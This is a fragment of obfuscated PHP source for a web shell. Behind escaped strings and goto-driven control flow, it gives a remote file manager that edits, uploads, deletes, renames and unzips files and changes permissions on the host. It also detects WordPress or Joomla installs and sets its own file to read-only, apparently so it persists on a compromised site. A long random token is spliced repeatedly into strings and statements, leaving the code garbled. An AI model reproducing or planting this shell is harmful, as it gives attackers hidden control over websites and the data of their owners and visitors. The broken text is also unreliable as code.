""\x3c\146\157\156\164\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\141\156\x67\145\x20\x70\145\162\155\x69\163\x73\151\157\x6e\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ154\163\x70\141\156\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ164\x69\157\156\40\x3d\40\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ151\x72\x3d"" . $Ia7Nm . ""\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ ""\x46\x69\x6c\145\x3a\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx67\x6e\75\x22\162\151\x67\x68\x74\x22\x3e\x3c\142\x72\76\74\151\x6e\160\x75\x74\x20\x74\171\x70\145\x20\x3d\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ74\x2f\x64\x69\x76\x3e\x3c\57\146\157\162\155\x3e\x3c\57\x74\x64\76\74\x2f\164\x72\76\xa""; goto rJUJX; adENK: goto X5E0k; goto npPv8; MilbN: $YvMra = ""\74\x66\x6f\156\164\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx69\x6f\156\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJr4wgw: goto vldYY; LxB8E: goto vfUPT; goto oRN21; ke8xg: $Erk1y = fopen($dWgkk, ""\167""); goto Eklqq; BUrrH: if (chmod($dWgkk, 0444)) { goto Dpxoy; } goto Q1PUk; rrC48: E18Pq: goto HtNxI; YNHpY: echo ""\x3c\x74\x72\76\x3c\x74\144\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\156\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\144\151\x72\75"" . $Ia7Nm . ""\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ = fread($Erk1y, filesize($dWgkk)); goto VY6uT; JUrVD: goto RBNMX; goto Gco03; PZlGQ: fzUl3: goto SEh7g; yMpQK: if (empty($_POST[""\x6e\145\x77""])) { goto vurBa; } goto c0Mmo; dyeOo: return ""\156\x6f\x20\x68\141\166\145\40\x70\x65\162\x6d\x69\x73\x73\x69\x6f\156\40\146\157\162\40\143\150\155\157\x64\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ scFer; y1ngN: goto yIEuL; goto DRK2X; YN3ke: $YvMra = ""\x3c\x66\x6f\156\164\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x61\156\147\x65\x20\160\x65\162\155\151\163\163\x69\x6f\156\41\74\x2f\x62\76\x3c\x2f\146\x6f\x6e\164\x3e""; goto ZZCfl; Jk_YY: return ""\x6e\157\40\x68\141\166\x65\40\160\145\162\155\151\x73\x73\x69\157\x6e\x20\x66\157\x72\x20\143\x68\155\x6f\x64\41""; goto WfxYG; nGvUp: goto l4ZX6; goto rrC48; Yew_E: goto FjKvC; goto sF1ba; OYo9p: goto r4wgw; goto hZQXr; sF1ba: vurBa: goto JPvZY; v52Gs: $RQ7hX = $_POST[""\156\x65\167""] . $RQ7hX; goto ovhak; MnC0i: if ($_POST[""\143\x68\x6d""] == ""\60\x37\65\x35"") { goto GHPeE; } goto ONy4i; S4Rr4: $RQ7hX = GX0lK($dWgkk); goto v52Gs; f2xAG: echo ""\74\164\x64\x20\x63\157\x6c\x73\160\x61\156\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx69\x6f\x6e\40\75\40\47\x68\164\164\160\72\x2f\x2f"" . $MVQ4B . ""\x3f\162\145\156\x61\x6d\x65\x3d"" . $dWgkk . ""\x26\x64\151\162\75"" . $Ia7Nm . ""\x27\x20\x6d\x65\x74\x68\x6f\144\40\75\x20\x27\120\x4f\x53\124\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJgoto ZyyZH; oU6CL: $RQ7hX = str_replace(""\74\164\145\170\164\x61\162\145\141\76"", ""\x3c\x74\145\x78\164\x61\162\x65\141\x3e"", $RQ7hX); goto JrBge; KXPjT: ft8sW: goto G5gTv; NOXA0: echo ""\x3c\x74\x65\x78\x74\141\162\x65\141\x20\x6e\141\x6d\145\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ75\x20\x27\x31\62\x30\x27\76"" . $RQ7hX . ""\x3c\57\x74\x65\x78\x74\x61\x72\x65\141\76\x3c\x62\162\x3e\xa""; goto oM_vM; IW1tN: YvZVH: goto MkFKD; usYiW: if (empty($_POST[""\143\x68\x6d""])) { goto NybWP; } goto MnC0i; cqjFH: echo ""\74\x69\156\160\165\164\40\164\x79\x70\145\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\157\x72\x6d\x3e\74\57\164\x64\x3e\x3c\57\x74\x72\x3e\xa""; goto BUrrH; AvD94: $Konpu = strripos($dWgkk, ""\x2f""); goto F4Y06; ZJ0zA: X5E0k: goto UatLI; s2TWz: NybWP: goto yMpQK; DioYs: echo ""\x3c\151\x6e\x70\165\x74\40\164\x79\x70\x65\75\x22\163\x75\x62\155\151\x74\x22\x20\x76\141\x6c\165\x65\x3d\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJecho ""\74\151\156\160\x75\164\x20\164\171\x70\x65\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x3d\42\67\62\42\x20\x76\141\x6c\165\145\75\42{$dWgkk}\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ160\145\75\x22\164\145\170\164\x22\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x61\154\165\x65\x3d\42{$dWgkk}\42\76""; goto TkUj2; G5gTv: echo $YvMra; goto s2TWz; q0lPR: aWqeH: goto DbAyN; rjGk7: $RQ7hX = fread($Erk1y, filesize($dWgkk)); goto gkFr5; gkFr5: fclose($Erk1y); goto iMvR2; ZTWHN: $ut6Ba = ""\74\146\x6f\x6e\x74\40\x63\x6f\154\x6f\x72\75\x22\x67\x72\x65\145\156\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x62\x3e\x3c\57\x66\157\x6e\164\x3e""; goto SV8Z3; ssz1A: echo ""\74\164\x72\x3e\x3c\164\144\40\141\154\151\147\x6e\x3d\42\x63\145\156\164\145\162\x22\x20\x63\x6f\154\163\x70\141\x6e\75\x22\65\x22\x3e\x3c\146\x6f\162\155\40\141\x63\164\151\x6f\156\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ144\151\162\x3d"" . $Ia7Nm . ""\47\x20\x6d\x65\164\x68\157\x64\x20\x3d\40\x27\x50\117\x53\x54\x27\76\12""; goto JgwMZ; Bf8fF: Pfcwo: goto Yjbz9; XKGfp: echo ""\74\x69\x6e\x70\x75\x74\40\x74\171\x70\145\x3d\x22\163\x75\x62\x6d\x69\x74\x22\x20\166\141\154\165\145\x3d\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJchmod($dWgkk, 0755)) { goto yFiZh; } goto TmnaC; Eklqq: if (fwrite($Erk1y, $_POST[""\x6e\x65\167""])) { goto AaDyo; } goto mL1Ct; EYoM1: Dpxoy: goto ZTWHN; cvZr3: echo ""\x3c\164\x65\x78\x74\141\x72\145\141\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\143\x6f\x6c\163\40\75\x20\47\x31\62\x30\47\x3e"" . $RQ7hX . ""\74\57\164\x65\x78\x74\x61\162\x65\x61\76\x3c\142\162\76\12""; goto qhu93; P51Ek: $RQ7hX = ""\143\x61\x6e\47\x74\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJgoto w1hGZ; Z7Cgx: $YvMra = ""\x3c\x66\157\x6e\164\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ151\157\156\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJut6Ba = ""\x3c\146\157\156\x74\40\x63\157\x6c\x6f\x72\x3d\x22\162\x65\x64\x22\x3e\x3c\142\76\x55\156\141\x62\x6c\x65\x20\143\150\x61\x6e\147\x65\x20\x70\145\x72\x6d\x69\163\x73\x69\157\x6e\41\x3c\x2f\x62\x3e\74\x2f\146\x6f\156\x74\x3e""; goto VVYn6; Yjbz9: RBNMX: goto AvD94; H__ZS: echo ""\x3c\x74\162\x3e\74\164\x64\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx35\42\x3e\74\146\x6f\x72\x6d\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\164\x3d"" . $dWgkk . ""\x26\144\151\162\x3d"" . $Ia7Nm . ""\47\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ = ""\x20\55\40\74\146\x6f\156\x74\x20\x63\x6f\154\x6f\x72\75\x22\147\x72\x65\x65\x6e\42\x3e\74\x62\76\x45\x64\151\x74\145\x64\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ, '', $Konpu, 99999); goto nM4be; JPvZY: $Konpu = strripos($dWgkk, ""\57""); goto Jn3PU; qhu93: echo ""\x3c\144\151\x76\40\141\x6c\x69\147\156\x3d\42\162\x69\147\x68\x74\x22\x3e\x3c\x62\162\x3e\x3c\x69\156\x70\x75\164\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx27\123\141\166\x65\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJgoto YNHpY; iMvR2: $RQ7hX = str_replace(""\74\x74\x65\170\x74\141\162\145\141\x3e"", ""\x3c\x74\x65\x78\x74\x61\x72\x65\x61\x3e"", $RQ7hX); goto H__ZS; vldYY: fclose($Erk1y); goto JUrVD; SV8Z3: eaJEK: goto Yew_E; civne: GHPeE: goto eH830; NPrCe: echo ""\156\x6f\40\x68\x61\x76\145\x20\x70\x65\x72\x6d\151\163\163\x69\157\156\74\x62\162\x3e""; goto P51Ek; Gco03: be48y: goto tZKnL; ZZCfl: goto gx1Lh; goto Pnrhw; qpdgn: if (fwrite($Erk1y, $RQ7hX)) { goto aWqeH; } goto HzTq3; f_uCN: echo ""\x46\151\x6c\145\72\x20"" . $dWgkk . $szW_z . ""\x3c\142\162\76\xa""; goto NOXA0; HzTq3: $szW_z = ""\40\x2d\x20\74\146\x6f\x6e\164\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ40\145\144\x69\164\x21\74\x2f\142\x3e\x3c\x2f\x66\x6f\x6e\x74\76""; goto OSJeO; O_2_D: l4ZX6: goto oU6CL; mL1Ct: $szW_z = ""\40\x2d\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ142\x6c\145\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJif (chmod($dWgkk, 0444)) { goto Pfcwo; } goto tj4O_; rJUJX: echo ""\74\164\x72\76\74\x74\x64\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\156\x20\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ162\75"" . $Ia7Nm . ""\47\x20\155\145\x74\x68\x6f\x64\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJgoto ssz1A; YyHkJ: $YvMra = ""\x3c\146\x6f\x6e\x74\x20\143\x6f\154\157\162\x3d\x22\162\145\144\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ163\151\x6f\156\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJP3UZ_: if (chmod($dWgkk, 0644)) { goto Fu1ak; } goto YN3ke; VVYn6: goto eaJEK; goto EYoM1; tZKnL: if (chmod($dWgkk, 0755)) { goto dUsmF; } goto Jk_YY; DRK2X: hyiAy: goto NPrCe; n3bIx: $Erk1y = fopen($dWgkk, ""\x72""); goto rjGk7; npPv8: yFiZh: goto MilbN; ovhak: $Erk1y = fopen($dWgkk, ""\167""); goto qpdgn; tj4O_: return ""\156\157\40\150\141\x76\x65\x20\x70\x65\162\x6d\x69\x73\163\x69\157\156\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ = ""\x20\x2d\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x64\x69\x74\145\x64\41\74\x2f\x62\76\x3c\57\x66\x6f\156\x74\76""; goto PsIqX; w30Xp: if ($_POST[""\x63\150\155""] == ""\60\66\x34\x34"") { goto Db2MD; } goto rLiS2; QVBBP: $YvMra = ""\74\x66\x6f\156\x74\x20\143\x6f\x6c\x6f\162\x3d\x22\x67\x72\x65\x65\x6e\x22\x3e\x3c\142\76\120\x65\162\155\x69\163\163\x69\x6f\x6e\x20\x63\150\x61\156\147\145\x64\x21\74\x2f\x62\x3e\74\57\x66\157\156\164\x3e""; goto wpbyM; VY6uT: fclose($Erk1y); goto y1ngN; vMLRr: yIEuL: goto O_2_D; UatLI: goto ft8sW; goto PZlGQ; SEh7g: if (chmod($dWgkk, 0444)) { goto saQ3O; } goto YyHkJ; ivNWl: $RQ7hX = ''; goto nGvUp; OSJeO: goto YvZVH; goto q0lPR; DFhN2: echo ""\74\x69\x6e\160\x75\x74\x20\x6e\141\x6d\x65\75\42\x63\150\x6d\42\x20\x73\151\172\x65\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ145\162\x3d\x22"" . gM9cq($dWgkk, ""\x31"") . ""\42\57\x3e""; goto XKGfp; qT4km: f2Xw9: goto ke8xg; F4Y06: $Ia7Nm = substr_replace($dWgkk, '', $Konpu, 99999); goto n3bIx; nM4be: if (file_exists($dWgkk) and filesize($dWgkk) > 1) { goto E18Pq; } goto ivNWl; ONy4i: if ($_POST[""\x63\150\x6d""] == ""\60\x34\x34\64"") { goto fzUl3; } goto w30Xp; oXIWg: goto ft8sW; goto civne; TkUj2: echo ""\x3c\151\156\160\x75\x74\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ40\57\x3e\x3c\x2f\x66\x6f\162\x6d\x3e\x3c\x2f\164\x64\76\74\x2f\164\x72\x3e\xa""; goto f9hpl; Pnrhw: Fu1ak: goto QVBBP; x2nxd: vfUPT: goto yyaV3; ZyyZH: Db2MD: goto P3UZ_; yvKbT: echo ""\74\x69\x6e\x70\165\x74\x20\x6e\x61\x6d\x65\75\x22\143\150\155\x22\x20\163\151\x7a\x65\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx65\x72\75\x22"" . gm9cQ($dWgkk, ""\61"") . ""\x22\x2f\76""; goto DioYs; rLiS2: $YvMra = ""\x30\67\x35\65\74\142\162\x3e\x30\x34\64\x34\74\x62\162\x3e\x30\66\x34\64\x3c\x62\162\x3e""; goto oXIWg; scFer: } goto P9h3R; oZsLs: goto kIwM_; goto DOjb2; RW3eb: MahxP: goto ioCZG; dOPqd: unlink($aPaH9); goto LjCDj; B5p40: goto rzo71; goto u39u2; L7_yf: $LztR2 = 1; goto Hxqi_; uk_0I: $QqgvR = $_SERVER[""\x53\103\122\x49\x50\124\x5f\116\101\x4d\105""]; goto Ox0jV; abb0P: $VdNWK = $_SERVER[""\x53\x45\x52\126\105\x52\x5f\x4e\x41\115\x45""]; goto Wb2hf; zd7Nq: $w8S3s = ""\150\x74\x74\160\x3a\57\x2f"" . $VdNWK . $QqgvR . ""\x3f\144\151\162\x3d"" . $_GET[""\x64\151\x72""] . ""\46\x6e\145\x77\x5f\x64\151\x72\x3d"" . $qag9p; goto j95qR; HQO8v: $LztR2 = 0; goto U8eX9; IHGon: if (empty($_POST[""\x66\x6f\x72\x5f\x64\145\x6c""])) { goto b2Dcx; } goto CpjCT; oz78r: if (isset($_GET[""\x64\x69\x72""])) { goto A0ywM; } goto y4bnf; y36Yt: goto DubCt; goto HIcgm; pSVyp: k97f1: goto N1mrP; ZCwQ2: $rwHC9 = ""\150\164\164\x70\x3a\x2f\57"" . $rwHC9 . ""\77\146\x69\156\x64\145\x72""; goto Fvq0g; Ox0jV: $DtzO6 = array(); goto cDKDj; ob3V3: paWk5($_SERVER[""\x53\103\x52\111\120\x54\137\x46\x49\x4c\x45\x4e\x41\x4d\105""]); goto Xyl4I; ttSZj: $qag9p = $_SERVER[""\104\117\x43\125\x4d\x45\x4e\x54\x5f\122\x4f\x4f\x54""]; goto ncknb; eLvFC: y1fL9($_GET[""\145\144\x69\164""], $MVQ4B); goto lgqsY; i3hIb: $CBxRP = NDomT($_SERVER[""\x44\x4f\x43\125\x4d\x45\116\124\137\x52\x4f\x4f\x54""]); goto pe2Nf; aTkN9: QwZuR: goto cQKyY; Bnibf: echo $fbXkE; goto eMK1j; zqHQr: $bmi_c = $_POST[""\x66\157\162\x5f\x64\145\154""]; goto fLVNY; HLNHF: if (!($L2igI[$n7IRr] !== null and $L2igI[$n7IRr] !== ""\40"" and $L2igI[$n7IRr] !== '' and $L2igI[$n7IRr] !== ""\56"" and $L2igI[$n7IRr] !== ""\x2e\56"")) { goto QwZuR; } goto zsQS9; ZZkHo: fclose($A12k0); goto U4RHe; upOid: if (isset($_GET[""\x64\x69\x72""])) { goto hQE5F; } goto ttSZj; q2S4r: A6_FD: goto p4GPE; ZzU_v: function Zwpme() { goto mnpgl; T8FQ3: return ""\x4a\x6f\157\x6d\x6c\x61\x21""; goto sOCy9; PqbEJ: iDsLv: goto fOq_c; sOCy9: goto iDsLv; goto ZfMhW; mnpgl: if (is_dir($_SERVER[""\x44\117\x43\125\115\x45\x4e\x54\137\x52\117\x4f\124""] . ""\57\x61\144\x6d\151\156\151\x73\x74\x72\141\x74\157\x72\x2f"") and is_dir($_SERVER[""\104\117\103\x55\x4d\105\x4e\x54\x5f\122\117\117\124""] . ""\57\x63\157\155\160\157\x6e\x65\x6e\164\163\57"") and is_dir($_SERVER[""\104\x4f\103\x55\x4d\105\x4e\x54\137\x52\117\117\x54""] . ""\57\151\x6e\143\x6c\x75\144\145\x73\57"")) { goto gQEVI; } goto ZfE4F; B0l1c: gQEVI: goto T8FQ3; Ac7Pq: return ""\125\x6e\x6b\x6e\157\x77\156""; goto kp8mg; ZfE4F: if (is_dir($_SERVER[""\x44\x4f\x43\x55\115\105\x4e\124\137\122\x4f\117\x54""] . ""\x2f\167\x70\55\143\x6f\156\164\145\x6e\x74\57"") and is_dir($_SERVER[""\104\x4f\x43\x55\115\x45\116\124\137\122\117\117\124""] . ""\x2f\167\160\55\x61\144\155\x69\156\57"") and is_dir($_SERVER[""\104\117\103\125\115\x45\116\124\x5f\122\x4f\x4f\x54""] . ""\57\x77\160\55\151\156\143\154\x75\144\x65\x73\x2f"")) { goto z80Xu; } goto Ac7Pq; kp8mg: goto iDsLv; goto B0l1c; qUEPk: return ""\127\x6f\x72\x64\x50\x72\145\x73\x73""; goto PqbEJ; ZfMhW: z80Xu: goto qUEPk; fOq_c: } goto Mms5Y; oOHbG: $rwHC9 = ""\x68\x74\x74\160\72\57\57"" . $rwHC9 . ""\x3f\146\151\156\x64\145\x72""; goto HdZXC; WyfMr: $w8S3s = ""\150\164\x74\x70\72\x2f\57"" . $VdNWK . $QqgvR . ""\x3f\x64\x69\162\75"" . $qag9p; goto aLK0K; QvzDi: $LztR2++; goto Be8GI; DwTlW: jqLnL: goto M_Cgd; Gqh_1: DubCt: goto SoZOb; jM6K5: s5sZv: goto QvzDi; QoeRX: mP2FX: goto k1N6X; UXqP9: if (isset($_GET[""\144\151\x72""])) { goto ICx_b; } goto xmi1W; CbyWF: echo ""\x3c\x61\x20\x68\x72\145\x66\x3d\x22"" . ""\150\164\164\x70\x3a\57\x2f"" . $VdNWK . $QqgvR . ""\77\x64\151\x72\x3d"" . $_SERVER[""\104\117\x43\125\115\105\116\124\x5f\x52\x4f\x4f\x54""] . ""\x22\x3e"" . $_SERVER[""\x44\117\103\x55\115\x45\116\x54\x5f\122\x4f\117\x54""] . ""\x3c\57\141\76""; goto ZpcIm; q584q: A16xm($_GET[""\144\x65\x6c""]); goto QIeXQ; DJVjG: $eb51o = UxuGj($B55HZ); goto Obdrk; opc3v: echo ""\74\164\162\76\74\164\x64\76\106\x69\156\151\x73\x68\x21\x3c\57\x74\x64\76\x3c\57\164\162\x3e""; goto Q3xHz; HWC40: S54lI: goto me323; pTDZJ: rzo71: goto zd7Nq; FpC9Y: unlink($B55HZ); goto glwiB; R_nez: $fbXkE = ""\74\x66\157\156\x74\40\x63\x6f\x6c\x6f\x72\x3d\x22\162\145\x64\x22\76\74\142\76\x4e\141\x6d\145\40\143\141\156\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ76""; goto cZ3fB; Q3Q8j: $L2igI = uXUgJ($aPaH9); goto hu3Xe; USSyq: E9ifv($w8S3s); goto kedt_; g3wGR: Q_ntA: goto k980M; i3o2E: elq9q: goto Epl6l; p1ei3: if (!isset($_GET[""\x6a\165\153\x65""])) { goto dss35; } goto i3hIb; Nrsy7: $qag9p = $_GET[""\144\151\x72""] . ""\x2f"" . $_POST[""\x6e\x65\167\x5f\x66\x69\154\145""]; goto HFGvx; Pu209: CyqNV: goto Ks4Ng; gdP6e: $qag9p = $_GET[""\x64\151\x72""]; goto McIeq; QlMPR: header(""\103\157\x6e\x74\145\156\164\x2d\x4c\x65\x6e\147\164\150\x3a\x20"" . filesize($whHds)); goto XgyOQ; vT88x: $rwHC9 = str_replace($_SERVER[""\x44\x4f\103\x55\x4d\x45\116\124\x5f\122\x4f\x4f\x54""], $_SERVER[""\x53\x45\122\126\105\122\x5f\116\x41\115\105""], $_SERVER[""\x53\103\122\x49\120\124\137\106\x49\x4c\105\116\101\115\x45""]); goto ZCwQ2; rK4mL: $XY0kc = ""\100\x24\x69\163\142\157\x74""; goto uUvCz; MZxU4: n6I2I: goto q584q; Y9dBE: hZdgt: goto Nrsy7; n1zYJ: if (!(isset($_FILES) && $_FILES[""\151\156\x70\x75\x74\146\151\154\145""][""\145\x72\162\x6f\162""] == 0)) { goto y1_MN; } goto upOid; PHOWA: chmod($_SERVER[""\x53\x43\122\111\120\124\x5f\x46\x49\114\x45\116\x41\115\x45""], 0444); goto B_Re_; u39u2: ICx_b: goto rdDfl; vgfDq: function Mvc0w($dWgkk) { goto Gbxos; q0Jtx: $zhek9 = str_replace($SYOxk, '', $dWgkk); goto F7xz2; F7xz2: $QgqT5 = new ZipArchive(); goto y6bAF; N4Jj4: echo ""\x3c\164\162\76\74\164\144\x3e\x46\151\154\x65\72\x20{$SYOxk}\x20\55\x20\74\x66\x6f\156\x74\40\143\157\x6c\x6f\162\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx6c\x79\74\57\x66\x6f\x6e\x74\x3e\74\57\x74\x64\76\74\57\x74\162\x3e""; goto HQ1yj; y6bAF: $QgqT5->open($dWgkk); goto t4pGg; t4pGg: $QgqT5->extractTo($zhek9); goto eRcYe; Gbxos: $SYOxk = strrchr($dWgkk, ""\x2f""); goto q0Jtx; eRcYe: $QgqT5->close(); goto N4Jj4; HQ1yj: } goto Xf03w; JrGk2: echo zWPME(); goto lNx_2; FPqBv: foreach ($hn0uw as $v3hoM) { goto zG58m; zG58m: if (!($v3hoM !== $_SERVER[""\x53\x43\x52\x49\x50\x54\137\106\111\114\105\x4e\x41\115\x45""])) { goto yJjxz; } goto vybvM; Yb2iM: I7byw: goto dV2kH; vybvM: fwrite($A12k0, $v3hoM . ""\12""); goto DvXnG; DvXnG: yJjxz: goto Yb2iM; dV2kH: } goto T0aee; HFGvx: kiHzi: goto bMo_L; zhlvb: goto ovOU3; goto R7ED7; LOmck: echo ""\74\x68\162\x3e\x3c\x68\x72\76\x3c\57\x74\x64\76""; goto a4BUt; HvNO6: if ($Erk1y = fopen($qag9p, ""\x77"")) { goto elq9q; } goto scMem; UWoNQ: QHihQ: goto jgc8L; bJ2hI: foreach ($DtzO6 as $v3hoM) { goto sGpjs; ttusL: WNuqH: goto vfGuF; nHZHA: $kUjp8 = ""\x23\146\146\146\146\x65\60""; goto NVE_T; XM6Hv: $Pykbw = $_SERVER[""\x44\x4f\103\125\115\x45\x4e\x54\137\x52\x4f\x4f\124""] . ""\57"" . $v3hoM; goto jLf1Q; c8mTA: C6R35: goto b1isP; hFwsy: $Npkhx = ac9DK($Y1ljX); goto gedtj; VZEsn: tzxj3: goto rQZ1M; dcizH: $Y1ljX = $_GET[""\x64\x69\162""] . ""\x2f"" . $v3hoM; goto KecXy; IyNJR: ra2m9: goto dcizH; gedtj: if ($Ay1ZD % 2 == 0) { goto C6R35; } goto nHZHA; T24Tn: if (isset($_GET[""\144\151\x72""])) { goto ra2m9; } goto jNVXv; jLf1Q: goto WNuqH; goto IyNJR; oYaM0: T4nO6: goto VZEsn; KecXy: $Pykbw = 